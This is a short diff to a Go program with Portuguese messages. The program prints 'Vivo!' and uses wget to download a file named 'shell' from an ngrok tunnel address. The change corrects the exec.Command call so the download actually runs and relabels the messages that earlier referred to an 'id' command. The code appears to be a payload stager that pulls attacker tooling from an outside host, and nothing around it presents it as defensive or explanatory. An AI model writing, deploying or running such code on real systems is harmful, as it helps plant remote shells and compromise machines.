@@ -7,11 +7,12 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("wget https://4847-189-40-72-61.ngrok-free.app/shell")
+        cmd := exec.Command("wget", "https://4847-189-40-72-61.ngrok-free.app/shell")
+
         output, err := cmd.Output()
         if err != nil {
-            fmt.Println("Erro ao executar o comando id:", err)
+            fmt.Println("Erro ao executar o comando wget:", err)
         } else {
-            fmt.Println("Saída do comando id:", string(output))
+            fmt.Println("Saída do comando wget:", string(output))
         }
 }
